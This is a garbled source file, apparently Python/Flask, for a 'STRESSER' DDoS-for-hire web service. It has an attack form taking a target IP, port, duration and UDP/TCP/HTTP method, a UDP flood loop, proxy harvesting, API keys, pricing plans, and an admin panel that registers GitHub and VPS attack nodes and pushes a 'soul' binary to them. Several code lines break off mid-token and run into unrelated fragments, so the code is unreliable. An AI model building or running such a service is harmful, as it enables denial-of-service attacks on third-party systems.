...
def api_attack():
    ...
    if key_obj.whitelist_ips:
        allowed_ips = [ip.strip() for ip in key_obj.whitelist_ips.# ---------- Proxy Management ----------
PROXY_LIST = []
LAST_PROXY_FETCH = 0
...
def api_attack():
    ...
    if key_obj.expires_at and datetime.utcnow() > key_obj.expires_at:
        return jsonify({'error': 'API key expired'}), 403
    if key_obj.whitelist_ips:
        allowed_ips = [ip.strip() for ip in key_obj.whitelist_ips.# ---------- Proxy Management (for HTTP fallback) ----------
PROXY_LIST = []
LAST_PROXY_FETCH = 0
...
@app.route('/api/keys/<int:key_id>/whitelist', methods=['POST'])
def update_api_key_whitelist(key_id):
    if 'user_id' not in session:
        return redirect(url_for('login'))
    ...
    key.whitelist_ips = whitelist_ips
    db.session.commit()
...
def admin_login():
    if request.method == 'POST':
        ...
        from werkzeug.security import check_passile time.time() < end_time:
            sock.sendto(payload, (target, port))
            packets += 1
        sock.close()
    elif method == "TCP":
...
def admin_login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        from werkzeug.s            lines = resp.text.splitlines()
            proxies = [p.strip() for p in lines if ":" in p and p.strip()]
            if proxies:
                new_proxies.extend(proxies)
        except:
...
def admin_add_node():
    ...
    if node_type == 'github':
        ...
        node = AttackNode(name=name, node_type='github', enabled=enabled, github_token=token, github_repo=repo)
    else:
        ...
        node = AttackNode(name=name, node_type='vps', enabled=enabled, vps_host=host, vps_port=port,
                          vps_username=username, vps_password=password, vps_key_path=key_path)
    db.session.add(node)
    db.session.commit()
...
<style>body{background:radial-gradient(circle at 10% 20%, #0a0a1a, #000); font-family:'Inter',sans-serif; color:#fff; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0;}
...
a{color:#00ffcc; text-decoration:none;}</style></head>
...
<form method="POST"><input type="text" name="token" placeholder="Access Token" required><button type="submit" class="btn-neon">🚀 Login</button></form>
...
<style>body{background:radial-gradient(circle at 10% 20%, #0a0a1a, #000); font-family:'Inter',sans-serif; color:#fff; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0;}
.glass-card{background:rgba(15,25,45,0.6); backdrop-filter:blur(12px); border-radius:32px; border:1px solid rgba(0,255,200,0.2); padding:40px; width:100%; max-width:450px; box-shadow:0 20px 40px rgba(0,0,0,0.4);}
.btn-neon{background:linear-gradient(90deg,#00b377,#00cc88); border:none; border-radius:40px; padding:12px; font-weight:bold; width:100%;}</style></head>
<body><div class="glass-card"><h2 class="text-center mb-4" style="color:#00ffcc;">✨ Create Account</h2>
{% with messages = get_flashed_messages(with_categories=true) %}{% for cat, msg in messages %}<div class="alert alert-{{ cat }}">{{ msg }}</div>{% endfor %}{% endwith %}
<form method="POST"><button type="submit" class="btn-neon">🎫 Generate Token</button></form>
...
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<style>body{background:radial-gradient(circle at 10% 20%, #0a0a1a, #000); font-family:'Inter',sans-serif; color:#fff;}
...
.pricing-card{text-align:center;}.price{font-size:36px; font-weight:800; color:#00ffcc;}</style></head>
...
<style>*{margin:0;padding:0;box-sizing:border-box;}body{background:radial-gradient(circle at 10% 20%, #0a0a1a, #000); font-family:'Inter',sans-serif; color:#eef5ff; overflow-x:hidden;}
.sidebar{position:fixed;left:0;top:0;width:280px;height:100%;background:rgba(5,10,20,0.85);backdrop-filter:blur(16px);border-right:1px solid rgba(0,255,200,0.2);padding:30px 20px;z-index:10;}
.main{margin-left:280px;padding:30px;position:relative;z-index:2;}
.glass-card{background:rgba(15,25,45,0.45);backdrop-filter:blur(12px);border-radius:32px;border:1px solid rgba(0,255,200,0.2);padding:28px;margin-bottom:30px;transition:0.3s;}
.glass-card:hover{border-color:rgba(0,255,200,0.6);transform:translateY(-3px);}
.btn-neon{background:linear-gradient(90deg,#00b377,#00cc88);border:none;border-radius:60px;padding:12px 24px;font-weight:bold;color:#000;width:100%;}
...
@media (max-width:800px){.sidebar{transform:translateX(-100%);}.main{margin-left:0;}.menu-toggle{display:block;position:fixed;top:20px;left:20px;z-index:20;background:#00ffcc;border:none;padding:8px 14px;border-radius:30px;}}
.menu-toggle{display:none;}.nav-link{display:block;padding:12px 20px;margin:8px 0;border-radius:40px;color:#ccd6f0;}
.nav-link:hover,.nav-link.active{background:rgba(0,255,200,0.15);color:#00ffcc;}</style></head>
...
<nav><a href="/dashboard" class="nav-link active"><i class="fas fa-tachometer-alt me-2"></i> Dashboard</a><a href="/attack" class="nav-link"><i class="fas fa-bolt me-2"></i> Attack Hub</a><a href="/api/keys" class="nav-link"><i class="fas fa-key me-2"></i> API Keys</a><a href="/products" class="nav-link"><i class="fas fa-shopping-cart me-2"></i> Products</a><a href="/logout" class="nav-link"><i class="fas fa-sign-out-alt me-2"></i> Logout</a></nav>
...
<script>document.getElementById('menuToggle').addEventListener('click',()=>document.getElementById('sidebar').classList.toggle('open'));</script></body></html>'''
...
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<style>body{background:radial-gradient(circle at 10% 20%, #0a0a1a, #000); font-family:'Inter',sans-serif; color:#fff;}.glass-card{background:rgba(15,25,45,0.45);backdrop-filter:blur(12px);border-radius:32px;border:1px solid rgba(0,255,200,0.2);padding:28px;margin-bottom:30px;}.btn-neon{background:linear-gradient(90deg,#00b377,#00cc88);border:none;border-radius:60px;padding:12px 24px;font-weight:bold;}</style></head>
<body><div class="container py-4"><div class="glass-card"><h2 class="mb-3"><i class="fas fa-bolt me-2"></i> Launch Attack</h2>
<form method="POST"><div class="mb-3"><label>Target IP Address</label><input type="text" name="target" class="form-control bg-dark text-white" required></div>
<div class="mb-3"><label>Port</label><input type="number" name="port" class="form-control bg-dark text-white" required></div>
<div class="mb-3"><label>Duration (seconds) – Max {{ user.max_duration }}s</label><input type="number" name="duration" class="form-control bg-dark text-white" value="60" min="1" max="{{ user.max_duration }}" required></div>
<div class="mb-3"><label>Attack Method</label><select name="method" class="form-control bg-dark text-white"><option>UDP</option><option>TCP</option><option>HTTP</option></select></div>
...
<script>document.querySelector('input[name="concurrent"]').addEventListener('input',function(e){this.nextElementSibling.value=this.value;});</script></body></html>'''

API_KEYS_HTML = '''<!DOCTYPE html>
<html><head><title>API Keys • STRESSER</title><meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<style>body{background:radial-gradient(circle at 10% 20%, #0a0a1a, #000); color:#fff;}.glass-card{background:rgba(15,25,45,0.45);backdrop-filter:blur(12px);border-radius:32px;border:1px solid rgba(0,255,200,0.2);padding:28px;margin-bottom:30px;}</style></head>
<body><div class="container py-4"><div class="glass-card"><h2><i class="fas fa-key me-2"></i> API Keys</h2><p>Keys are shown once on creation and cannot be recovered.</p>
<form method="POST"><div class="input-group mb-3"><input type="text" name="name" placeholder="Key name" class="form-control bg-dark text-white"><button class="btn btn-neon">+ Create Key</button></div></form>
<table class="table table-dark"><thead><tr><th>Name</th><th>Key</th><th>Created</th><th>Actions</th></tr></thead><tbody>{% for k in keys %}<tr><td>{{ k.name }}</td><td><code>{{ k.key[:20] }}...</code></td><td>{{ k.created_at.strftime('%Y-%m-%d') }}</td><td><form method="POST" action="/api/keys/{{ k.id }}/delete"><button class="btn btn-sm btn-danger">Delete</button></form></td></tr>{% else %}<tr><td colspan="4">No API keys found.</td></tr>{% endfor %}</tbody></table></div><a href="/dashboard" class="btn btn-link text-info">← Back</a></div></body></html>'''
...
input{background:rgba(0,0,0,0.5); border:1px solid #2a3a5a; border-radius:40px; padding:12px 20px; color:white; width:100%; margin-bottom:20px;}
input:focus{outline:none; border-color:#ff3366; box-shadow:0 0 12px #ff3366;}
.btn-admin{background:linear-gradient(90deg,#ff3366,#ff6680); border:none; border-radius:40px; padding:12px; font-weight:bold; width:100%;}</style></head>
...
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>body{background:radial-gradient(circle at 10% 20%, #0a0a1a, #000); font-family:'Inter',sans-serif; color:#fff;}
.sidebar{position:fixed;left:0;top:0;width:260px;height:100%;background:rgba(5,10,20,0.95);border-right:1px solid rgba(255,51,102,0.3);padding:30px 20px;}
.main{margin-left:260px;padding:30px;}
.glass-card{background:rgba(15,25,45,0.45);backdrop-filter:blur(12px);border-radius:24px;border:1px solid rgba(255,51,102,0.2);padding:20px;margin-bottom:25px;}
.stat-number{font-size:32px;font-weight:800;background:linear-gradient(135deg,#fff,#ff6680);-webkit-background-clip:text;background-clip:text;color:transparent;}
.nav-link{display:block;padding:12px 20px;margin:8px 0;border-radius:40px;color:#ccd6f0;}
.nav-link:hover,.nav-link.active{background:rgba(255,51,102,0.15);color:#ff6680;}</style></head>
<body><div class="sidebar"><h3 style="color:#ff6680;">👑 Admin Panel</h3>
<nav><a href="/admin/dashboard" class="nav-link active"><i class="fas fa-tachometer-alt me-2"></i> Dashboard</a><a href="/admin/users" class="nav-link"><i class="fas fa-users me-2"></i> Users</a><a href="/admin/attacks" class="nav-link"><i class="fas fa-history me-2"></i> Attack Logs</a><a href="/admin/nodes" class="nav-link"><i class="fas fa-server me-2"></i> Attack Nodes</a><a href="/admin/settings" class="nav-link"><i class="fas fa-cog me-2"></i> Settings</a><a href="/admin/logout" class="nav-link"><i class="fas fa-sign-out-alt me-2"></i> Logout</a></nav></div>
<div class="main"><h2>Admin Dashboard</h2><div class="row g-4 mb-4"><div class="col-md-3"><div class="glass-card text-center"><div class="stat-number">{{ total_users }}</div><div>Total Users</div></div></div><div class="col-md-3"><div class="glass-card text-center"><div class="stat-number">{{ total_attacks }}</div><div>Total Attacks</div></div></div><div class="col-md-3"><div class="glass-card text-center"><div class="stat-number">{{ total_nodes }}</div><div>Total Nodes</div></div></div><div class="col-md-3"><div class="glass-card text-center"><div class="stat-number">{{ active_nodes }}</div><div>Active Nodes</div></div></div></div>
...
<div class="glass-card"><h4>Recent Users</h4><div class="table-responsive"><table class="table table-dark"><thead><tr><th>ID</th><th>Token</th><th>Plan</th><th>Attacks</th><th>Created</th></tr></thead><tbody>{% for u in users %}<tr><td>{{ u.id }}</td><td><code>{{ u.token[:16] }}...</code></td><td>{{ u.plan }}</td><td>{{ u.total_attacks }}</td><td>{{ u.created_at.strftime('%Y-%m-%d') }}</td></tr>{% endfor %}</tbody></table></div></div></div></body></html>'''

ADMIN_USERS_HTML = '''<!DOCTYPE html>
<html><head><title>Admin Users • STRESSER</title><link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"><style>body{background:#0a0a1a; color:#fff; padding:20px;}</style></head>
<body><div class="container"><h2>User Management</h2><a href="/admin/dashboard" class="btn btn-secondary mb-3">← Back</a>
<div class="table-responsive"><table class="table table-dark"><thead><tr><th>ID</th><th>Token</th><th>Plan</th><th>Max Concurrent</th><th>Max Duration</th><th>Total Attacks</th><th>Created</th><th>Actions</th></tr></thead><tbody>{% for u in users %}<tr><td>{{ u.id }}</td><td><code>{{ u.token[:24] }}...</code></td><td>{{ u.plan }}</td><td><form method="POST" action="/admin/users/{{ u.id }}/edit" style="display:inline"><input type="number" name="max_concurrent" value="{{ u.max_concurrent }}" style="width:60px"><button type="submit" name="action" value="set_limit" class="btn btn-sm btn-primary">Set</button></form></td><td>{{ u.max_duration }}s</td><td>{{ u.total_attacks }}</td><td>{{ u.created_at.strftime('%Y-%m-%d') }}</td><td><form method="POST" action="/admin/users/{{ u.id }}/edit" style="display:inline"><button type="submit" name="action" value="reset_token" class="btn btn-sm btn-warning">Reset Token</button></form><form method="POST" action="/admin/users/{{ u.id }}/edit" style="display:inline" onsubmit="return confirm('Delete user?')"><button type="submit" name="action" value="delete" class="btn btn-sm btn-danger">Delete</button></form></td></tr>{% endfor %}</tbody></table></div></div></body></html>'''

ADMIN_ATTACKS_HTML = '''<!DOCTYPE html>
<html><head><title>Admin Attacks • STRESSER</title><link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"><style>body{background:#0a0a1a; color:#fff; padding:20px;}</style></head>
<body><div class="container"><h2>Attack Logs</h2><a href="/admin/dashboard" class="btn btn-secondary mb-3">← Back</a>
<div class="table-responsive"><table class="table table-dark"><thead><tr><th>ID</th><th>User ID</th><th>Target</th><th>Port</th><th>Method</th><th>Duration</th><th>Concurrent</th><th>Status</th><th>Time</th></tr></thead><tbody>{% for a in attacks %}<tr><td>{{ a.id }}</td><td>{{ a.user_id }}</td><td>{{ a.target }}</td><td>{{ a.port }}</td><td>{{ a.method }}</td><td>{{ a.duration }}s</td><td>{{ a.concurrent }}</td><td>{{ a.status }}</td><td>{{ a.timestamp.strftime('%Y-%m-%d %H:%M:%S') }}</td></tr>{% endfor %}</tbody></table></div></div></body></html>'''

ADMIN_NODES_HTML = '''<!DOCTYPE html>
<html><head><title>Admin Nodes • STRESSER</title><link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"><style>body{background:#0a0a1a; color:#fff; padding:20px;}</style></head>
<body><div class="container"><h2>Attack Node Management</h2><a href="/admin/dashboard" class="btn btn-secondary mb-3">← Back</a>
<div class="card bg-dark mb-4"><div class="card-header">Add New Node</div><div class="card-body"><form method="POST" action="/admin/nodes/add" class="row g-2"><input type="text" name="name" placeholder="Name" class="col" required><select name="node_type" class="col"><option value="github">GitHub</option><option value="vps">VPS</option></select><input type="text" name="github_token" placeholder="GitHub Token" class="col"><input type="text" name="github_repo" placeholder="owner/repo" class="col"><input type="text" name="vps_host" placeholder="VPS Host" class="col"><input type="number" name="vps_port" placeholder="Port" class="col" value="22"><input type="text" name="vps_username" placeholder="Username" class="col"><input type="password" name="vps_password" placeholder="Password" class="col"><input type="text" name="vps_key_path" placeholder="SSH Key Path" class="col"><div class="col"><input type="checkbox" name="enabled"> Enabled</div><button type="submit" class="btn btn-primary col">Add Node</button></form></div></div>
<div class="card bg-dark mb-4"><div class="card-header">Distribute Binary</div><div class="card-body"><form method="POST" action="/admin/upload_binary" enctype="multipart/form-data" class="row g-2"><div class="col-md-8"><input type="file" name="binary" class="form-control bg-dark text-white" required></div><div class="col-md-4"><button type="submit" class="btn btn-warning">Upload & Distribute</button></div></form><small class="text-muted">Upload your compiled 'soul' binary. It will be sent to all enabled nodes.</small></div></div>
<div class="table-responsive"><table class="table table-dark"><thead><tr><th>Name</th><th>Type</th><th>Enabled</th><th>Details</th><th>Actions</th></tr></thead><tbody>{% for n in nodes %}<tr><td>{{ n.name }}</td><td>{{ n.node_type }}</td><td>{{ n.enabled }}</td><td>{% if n.node_type=='github' %}{{ n.github_repo }}{% else %}{{ n.vps_host }}:{{ n.vps_port }}{% endif %}</td><td><form method="POST" action="/admin/nodes/{{ n.id }}/toggle" style="display:inline"><button class="btn btn-sm btn-warning">Toggle</button></form><form method="POST" action="/admin/nodes/{{ n.id }}/delete" style="display:inline" onsubmit="return confirm('Delete node?')"><button class="btn btn-sm btn-danger">Delete</button></form></td></tr>{% endfor %}</tbody></table></div></div></body></html>'''

ADMIN_SETTINGS_HTML = '''<!DOCTYPE html>
<html><head><title>Admin Settings • STRESSER</title><link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"><style>body{background:#0a0a1a; color:#fff; padding:20px;}</style></head>
<body><div class="container"><div class="card bg-dark"><div class="card-header">Admin Settings</div><div class="card-body"><form method="POST"><div class="mb-3"><label>Change Admin Password</label><input type="password" name="new_admin_password" class="form-control bg-dark text-white" placeholder="New password (min 6 chars)" required></div><button type="submit" class="btn btn-primary">Update Password</button></form></div></div><a href="/admin/dashboard" class="btn btn-secondary mt-3">← Back</a></div></body></html>'''
